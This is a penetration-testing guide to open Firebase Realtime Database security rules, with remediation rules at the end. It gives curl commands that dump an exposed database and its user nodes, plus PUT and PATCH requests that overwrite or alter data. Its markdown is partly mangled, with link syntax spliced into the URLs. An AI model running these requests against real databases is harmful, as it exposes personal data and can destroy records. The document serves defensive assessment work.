# Firebase Realtime Database Assessment

Firebase Realtime Database (RTDB) is a NoSQL cloud database where data is stored as JSON and synchronized in real-time. Because it is exposed directly to the internet, misconfigured security rules allow complete database read, write, and deletion access.

---

## 1. High-Speed Enumeration

The first step during an internal or external web assessment is locating the Firebase URL. This is typically hardcoded inside client-side JS bundles as `databaseURL: "https://<PROJECT-ID>.firebaseio.com"`.

### Unauthenticated Read Test
If security rules are misconfigured to `.read: true`, the entire database can be dumped in JSON format by appending `.json` to the root URL.

```bash
curl -i -s -k "https://<PROJECT-ID>[.firebaseio.com/.json](https://.firebaseio.com/.json)"
Vulnerable Response (200 OK): Returns the full database schema and user data in plain text.

Secured Response (401 Unauthorized): Returns {"error" : "Permission denied"}.

Targeted Node Enumeration
Even if the root / is protected with a 401 Unauthorized, nested child nodes might still be readable due to cascading rule logic. Always fuzz common paths:

Bash
curl -s "https://<PROJECT-ID>[.firebaseio.com/users.json](https://.firebaseio.com/users.json)"
curl -s "https://<PROJECT-ID>[.firebaseio.com/settings.json](https://.firebaseio.com/settings.json)"
curl -s "https://<PROJECT-ID>[.firebaseio.com/configs.json](https://.firebaseio.com/configs.json)"
2. Exploitation & Write Testing
If .write is set to true, an attacker can modify, overwrite, or delete data within the database.

Data Injection (Invasive/Destructive)
Using a PUT request will overwrite the specified endpoint entirely. Use this with extreme caution on active assessments.

Bash
curl -X PUT \
  -H "Content-Type: application/json" \
  -d '{"poc_exploit_test": "vulnerable"}' \
  "https://<PROJECT-ID>[.firebaseio.com/poc_check.json](https://.firebaseio.com/poc_check.json)"
Data Patching (Non-Destructive)
A PATCH request is safer for proof-of-concept verification as it updates specific keys without overwriting the entire node.

Bash
curl -X PATCH \
  -H "Content-Type: application/json" \
  -d '{"debug_mode": true}' \
  "https://<PROJECT-ID>[.firebaseio.com/config.json](https://.firebaseio.com/config.json)"
3. Hardening and Remediation
To secure the Realtime Database, developers must replace default open rules with granular path validations.

Vulnerable Setup (Default/Open)
JSON
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
Remediated Setup (User-Owned Data Only)
Rules cascade; therefore, the root should default to false, and access should be authorized at specific child paths:

JSON
{
  "rules": {
    ".read": false,
    ".write": false,
    "users": {
      "$uid": {
        ".read": "$uid === auth.uid",
        ".write": "$uid === auth.uid"
      }
    }
  }
}
